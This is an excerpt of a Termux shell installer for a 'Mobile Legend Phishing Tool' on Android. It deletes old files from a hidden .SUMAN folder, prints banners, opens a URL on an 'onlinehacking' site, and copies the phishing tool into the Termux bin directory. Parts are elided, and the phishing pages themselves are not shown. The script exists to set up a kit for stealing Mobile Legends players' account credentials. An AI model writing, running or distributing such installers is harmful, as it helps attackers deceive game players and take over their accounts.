...
echo ""
rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/1-Skin-Diamonds
rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/2-Event-Red
rm -rf /data/data/com.termux/files/usr/bin/.SUMAN/3-Event-Blue
...
echo ""
echo ""
echo -e "\e[1m \e[36m[+] There Mobile Legend Phishing Tool Script for Android \e[m \e[21"
echo ""
echo ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
...
echo ""
termux-open-url https://www.onlinehacking.xyz/2021/07/MobileLegend-Phishing-Hack-Termux.html
echo ""
clear
echo ""
echo -e " \e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Mobile Legend Phishing Tool Please Wait....  \e[0m"
echo -e ""
echo ""
echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
...
cp -R MobileLegend-Phishing /data/data/com.termux/files/usr/bin
